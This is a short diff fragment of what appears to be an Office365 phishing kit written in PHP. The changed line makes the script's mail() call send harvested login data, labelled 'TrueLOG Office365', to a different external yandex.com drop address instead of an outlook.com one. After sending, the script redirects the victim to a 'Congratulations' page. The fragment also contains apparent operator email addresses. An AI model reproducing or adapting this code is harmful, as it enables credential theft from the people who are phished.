@@ -37,7 +37,7 @@ $message .=     "=======================================\n";
 $sniper = 'TrueLOG Office365';
 $who_be_the_boss = 'AV';
 $from = "From: $who_be_the_boss <west>\n";
-mail("ivorsmith111@outlook.com",$sniper,$message,$from);
+mail("est1900bc@yandex.com",$sniper,$message,$from);
 header("location: Congratulations.php?=" . $log);
 		}
 	if ($mgs == 0)
